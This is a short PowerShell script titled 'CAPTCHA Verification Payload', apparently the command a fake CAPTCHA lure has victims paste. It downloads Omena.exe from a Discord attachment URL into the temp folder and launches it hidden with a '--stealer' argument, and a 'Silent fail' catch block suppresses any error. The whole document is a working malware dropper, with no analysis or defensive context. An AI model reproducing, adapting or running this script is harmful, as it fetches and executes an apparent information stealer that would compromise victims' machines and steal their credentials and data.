# CAPTCHA Verification Payload
try {
    $exePath = "$env:TEMP\Omena.exe"
    $url = "https://cdn.discordapp.com/attachments/1517205249323040932/1517230097260609677/Omena.exe?ex=6a358623&is=6a3434a3&hm=3a1e3ce3379a4244a106efc131b6a8410d9cd5380a06fff2f3f476527fcecc36&"   # <--- Change this
    
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    # Silent fail
}
